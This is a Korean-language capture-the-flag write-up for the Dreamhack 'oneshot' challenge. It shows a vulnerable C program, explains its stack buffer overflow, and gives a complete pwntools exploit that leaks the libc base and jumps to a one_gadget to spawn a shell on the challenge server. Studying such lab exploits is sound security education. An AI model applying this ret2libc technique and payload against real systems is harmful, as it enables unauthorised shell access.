```c
// Name: oneshot.c
// gcc -o oneshot1 oneshot1.c -fno-stack-protector -fPIC -pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("MSG: ");
    read(0, msg, 46);

    if (check > 0) {
        exit(0);
    }

    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}
```

```bash
$ checksec ./oneshot
[*] './oneshot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

# 분석

## 보호 기법

NX, PIE가 적용되어 있으며, stack canary는 적용되어 있지 않고, partial RELRO가 적용되어 있다.

## 코드 분석

* `oneshot.c:26` : `stdout`의 주소를 얻을 수 있다.
* `oneshot.c:28-35` : `msg`의 크기는 16바이트 뿐이나, 최대 46바이트의 데이터를 읽고 있으므로 스택 오버플로우가 발생한다. 단, `check` 변수가 일종의 스택 카나리 역할을 하고 있으므로 이를 신경 써서 데이터를 입력해야 한다.
* `oneshot.c:36` : `memset`을 호출한다.

# 공격

one_gadget 툴을 이용하여 oneshot gadget들의 offset을 얻어낼 수 있다.

```bash
$ one_gadget libc-2.23.so
0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```

그러나, 이 offset을 이용하여 실제 메모리 상에서의 주소를 알아내기 위해서는 libc 파일의 베이스를 알아내야 한다. 이때, `oneshot.c:26`에서 `stdout`의 주소를 출력하므로 `stdout`의 offset을 이 주소에서 빼주면 libc 파일의 베이스를 얻을 수 있다.

이를 종합하여 익스플로잇 코드를 작성하면 다음과 같다.

```python
# Name: oneshot.py

from pwn import *

HOST = 'host3.dreamhack.games'
PORT = 19210 # the given port

# conn = process('./oneshot') # local
conn = remote(HOST, PORT)

e = ELF('./oneshot')
libc = ELF('./libc-2.23.so')

one_gadget = 0xf1247

# leak libc base
conn.recvuntil(b'stdout: ')
stdout = int(conn.recvline()[:-1], base=16)
libc_base = stdout - libc.sym['_IO_2_1_stdout_']
one_gadget = libc_base + one_gadget

# exploit
payload = b'A' * 0x18
payload += p64(0)
payload += b'B' * 0x8
payload += p64(one_gadget)

conn.sendafter(b'MSG: ', payload)
conn.interactive()
```